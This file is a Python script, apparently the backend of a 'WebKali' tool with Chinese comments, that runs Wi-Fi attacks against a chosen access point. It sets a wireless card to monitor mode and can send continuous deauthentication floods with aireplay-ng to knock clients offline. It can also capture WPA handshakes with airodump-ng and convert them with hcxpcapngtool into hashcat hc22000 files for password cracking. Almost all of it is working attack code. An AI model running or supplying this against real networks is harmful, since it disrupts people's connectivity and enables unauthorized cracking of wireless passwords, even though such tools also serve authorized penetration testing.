import argparse
import subprocess
import time
import os
import sys
import glob
import shutil

# ==========================================
# WebKali 攻击执行单元 (诊断模式)
# ==========================================

# 1. 强制修复环境变量 (防止 SSH 找不到命令)
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    """普通命令静默执行"""
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def setup_monitor(interface, channel):
    print(f"[*] Setting up {interface} on CH {channel}")
    if "eth" in interface:
        print("[!] ERROR: 禁止操作 eth 有线网卡")
        sys.exit(1)

    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")

    for _ in range(3):
        run_cmd(f"iw dev {interface} set channel {channel}")
        run_cmd(f"iwconfig {interface} channel {channel}")
        time.sleep(0.5)


def capture_handshake(bssid, interface, channel, duration):
    print(f"[*] Capture started: {bssid} (CH {channel})")

    # 清理旧进程
    run_cmd("killall airodump-ng aireplay-ng")
    setup_monitor(interface, channel)

    prefix = f"/tmp/handshake_{bssid.replace(':', '')}"
    for f in glob.glob(f"{prefix}*"): os.remove(f)

    # 1. 启动录制
    dump_cmd = f"airodump-ng --bssid {bssid} --channel {channel} --write {prefix} --output-format pcap {interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. 攻击诱发重连
    start = time.time()
    print("[*] Waiting for handshake (Deauth attack active)...")
    while (time.time() - start) < int(duration):
        if dump_proc.poll() is not None: break
        # 每5秒发送一次 Deauth
        run_cmd(f"aireplay-ng --ignore-negative-one -0 2 -a {bssid} {interface}")
        time.sleep(5)

    dump_proc.terminate()
    run_cmd("killall airodump-ng")

    # 3. 结果检查 & 诊断转换
    cap = f"{prefix}-01.cap"
    if not os.path.exists(cap): cap = f"{prefix}-01.pcap"

    if os.path.exists(cap) and os.path.getsize(cap) > 1000:
        print(f"[SUCCESS] File captured: {cap} (Size: {os.path.getsize(cap)} bytes)")

        # === 核心修改：详细输出转换日志 ===
        hc_file = f"{prefix}.hc22000"
        cmd = f"hcxpcapngtool -o {hc_file} {cap}"

        print(f"[*] 正在尝试转换: {cmd}")
        print("---------------- [工具输出开始] ----------------")

        # 捕获并打印输出
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            print(proc.stdout)  # 打印工具的所有输出
            print("---------------- [工具输出结束] ----------------")

            if os.path.exists(hc_file):
                print(f"[SUCCESS] ✅ Hash file generated successfully: {hc_file}")
                print("CAPTURED_HS_POTENTIAL")  # 告诉后端成功了
            else:
                print("[WARN] ❌ .hc22000 文件未生成！")
                print("       原因分析：")
                print("       1. 工具可能报错 (看上面日志)")
                print("       2. 最可能：抓包文件中没有包含有效的握手包 (EAPOL M1+M2 或 PMKID)")
        except Exception as e:
            print(f"[ERROR] 执行出错: {e}")

    else:
        print("[FAIL] Capture failed or file too small")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="30")
    args = parser.parse_args()

    if args.mode == "deauth":
        setup_monitor(args.interface, args.channel)
        # 简单的 Deauth 调用
        subprocess.Popen(f"aireplay-ng --ignore-negative-one -0 0 -a {args.bssid} {args.interface}",
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(int(args.duration))
        run_cmd("killall aireplay-ng")

    elif args.mode == "handshake":
        capture_handshake(args.bssid, args.interface, args.channel, args.duration)